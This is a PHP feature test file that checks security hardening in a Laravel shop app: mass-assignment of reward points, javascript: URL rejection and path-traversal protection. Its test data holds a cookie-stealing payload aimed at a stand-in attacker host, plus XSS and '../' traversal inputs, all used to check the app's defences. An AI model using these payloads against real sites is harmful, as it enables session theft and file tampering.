<?php

namespace Tests\Feature;

use App\Models\Admin;
use App\Models\Product;
use App\Models\RecipeKit;
use App\Models\Slider;
use App\Models\StoreSetting;
use App\Models\User;
use Database\Seeders\AdminSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

class SecurityHardeningTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->seed(AdminSeeder::class);
    }

    public function test_user_reward_points_cannot_be_mass_assigned_on_create(): void
    {
        $user = User::create([
            'name' => 'Attempted Exploit User',
            'email' => 'exploit@example.com',
            'password' => Hash::make('password123'),
            'reward_points' => 99999,
        ]);

        $this->assertNotEquals(99999, $user->reward_points);
        $this->assertSame(100, (int) $user->reward_points);
        $this->assertSame(100, (int) $user->fresh()->reward_points);
    }

    public function test_user_reward_points_cannot_be_mass_assigned_on_update(): void
    {
        $user = User::create([
            'name' => 'Legitimate User',
            'email' => 'legit@example.com',
            'password' => Hash::make('password123'),
        ]);

        $this->assertSame(100, (int) $user->reward_points);

        $user->update([
            'name' => 'Updated User Name',
            'reward_points' => 88888,
        ]);

        $this->assertSame('Updated User Name', $user->fresh()->name);
        $this->assertNotEquals(88888, $user->fresh()->reward_points);
        $this->assertSame(100, (int) $user->fresh()->reward_points);
    }

    public function test_slider_store_rejects_javascript_url_scheme(): void
    {
        $admin = Admin::where('email', 'admin@masalamart.com')->first();

        $response = $this->actingAs($admin, 'admin')->post(route('admin.sliders.store'), [
            'title' => 'Malicious Slider Title',
            'cta_text' => 'Click Here',
            'link_url' => 'javascript:alert(document.cookie)',
        ]);

        $response->assertSessionHasErrors('link_url');
        $this->assertDatabaseMissing('sliders', [
            'title' => 'Malicious Slider Title',
        ]);
    }

    public function test_slider_update_rejects_javascript_url_scheme(): void
    {
        $admin = Admin::where('email', 'admin@masalamart.com')->first();
        $slider = Slider::create([
            'title' => 'Safe Slider',
            'cta_text' => 'Shop Now',
            'link_url' => '/products/safe',
            'image' => '/images/safe.jpg',
            'sort_order' => 1,
            'is_active' => true,
        ]);

        $response = $this->actingAs($admin, 'admin')->put(route('admin.sliders.update', $slider->id), [
            'title' => 'Safe Slider',
            'cta_text' => 'Shop Now',
            'link_url' => 'javascript:fetch("https://attacker.com/?steal="+document.cookie)',
        ]);

        $response->assertSessionHasErrors('link_url');
        $this->assertSame('/products/safe', $slider->fresh()->link_url);
    }

    public function test_slider_accepts_valid_http_https_and_relative_urls(): void
    {
        $admin = Admin::where('email', 'admin@masalamart.com')->first();

        $response1 = $this->actingAs($admin, 'admin')->post(route('admin.sliders.store'), [
            'title' => 'Relative URL Slider',
            'cta_text' => 'Browse Sweets',
            'link_url' => '/categories/sweets',
            'image_url' => 'https://example.com/banner.jpg',
        ]);
        $response1->assertSessionHasNoErrors();

        $response2 = $this->actingAs($admin, 'admin')->post(route('admin.sliders.store'), [
            'title' => 'Absolute HTTPS Slider',
            'cta_text' => 'Visit Partner',
            'link_url' => 'https://partner.example.com/offers',
            'image_url' => 'https://example.com/banner2.jpg',
        ]);
        $response2->assertSessionHasNoErrors();
    }

    public function test_store_setting_rejects_javascript_maps_url(): void
    {
        $admin = Admin::where('email', 'admin@masalamart.com')->first();
        $current = StoreSetting::current();

        $response = $this->actingAs($admin, 'admin')->put(route('admin.store-info.update'), array_merge(
            $current->toArray(),
            [
                'maps_url' => 'javascript:alert(1)',
            ]
        ));

        $response->assertSessionHasErrors('maps_url');
        $this->assertNotSame('javascript:alert(1)', StoreSetting::current()->maps_url);
    }

    public function test_store_setting_accepts_valid_maps_url(): void
    {
        $admin = Admin::where('email', 'admin@masalamart.com')->first();
        $current = StoreSetting::current();

        $response = $this->actingAs($admin, 'admin')->put(route('admin.store-info.update'), array_merge(
            $current->toArray(),
            [
                'maps_url' => 'https://maps.google.com/?q=Central+Market',
            ]
        ));

        $response->assertSessionHasNoErrors();
        $this->assertSame('https://maps.google.com/?q=Central+Market', StoreSetting::current()->maps_url);
    }

    public function test_product_media_cleanup_prevents_path_traversal(): void
    {
        Storage::fake('public');
        $admin = Admin::where('email', 'admin@masalamart.com')->first();

        // Create a target file in products and a sensitive file in root public disk
        Storage::disk('public')->put('products/product-image.jpg', 'product-content');
        Storage::disk('public')->put('important.txt', 'do-not-delete');

        // Simulate a product record that attempted path traversal in its images array
        $product = Product::factory()->create([
            'images' => [
                '/storage/products/product-image.jpg',
                '/storage/products/../important.txt',
            ],
        ]);

        $response = $this->actingAs($admin, 'admin')
            ->delete(route('admin.products.destroy', $product));

        $response->assertRedirect(route('admin.products.index'));

        // Target file in products should be deleted
        Storage::disk('public')->assertMissing('products/product-image.jpg');
        // File outside products directory must NOT be deleted due to basename() isolation
        Storage::disk('public')->assertExists('important.txt');
    }

    public function test_recipe_kit_media_cleanup_prevents_path_traversal(): void
    {
        Storage::fake('public');
        $admin = Admin::where('email', 'admin@masalamart.com')->first();

        Storage::disk('public')->put('recipe-kits/kit-image.jpg', 'kit-content');
        Storage::disk('public')->put('sensitive.txt', 'critical-data');

        $recipeKit = RecipeKit::create([
            'name' => 'Paneer Butter Masala Kit',
            'slug' => 'paneer-butter-masala-kit',
            'subtitle_tag' => 'CHEF-CRAFTED',
            'price' => 14.99,
            'original_price' => 18.99,
            'servings' => 'Serves 4',
            'cooking_time' => '20 mins',
            'difficulty' => 'Easy',
            'image' => '/storage/recipe-kits/kit-image.jpg',
            'images' => [
                '/storage/recipe-kits/kit-image.jpg',
                '/storage/recipe-kits/../sensitive.txt',
            ],
            'is_active' => true,
        ]);

        $response = $this->actingAs($admin, 'admin')
            ->delete(route('admin.recipe-kits.destroy', $recipeKit));

        $response->assertRedirect(route('admin.recipe-kits.index'));

        Storage::disk('public')->assertMissing('recipe-kits/kit-image.jpg');
        Storage::disk('public')->assertExists('sensitive.txt');
    }
}
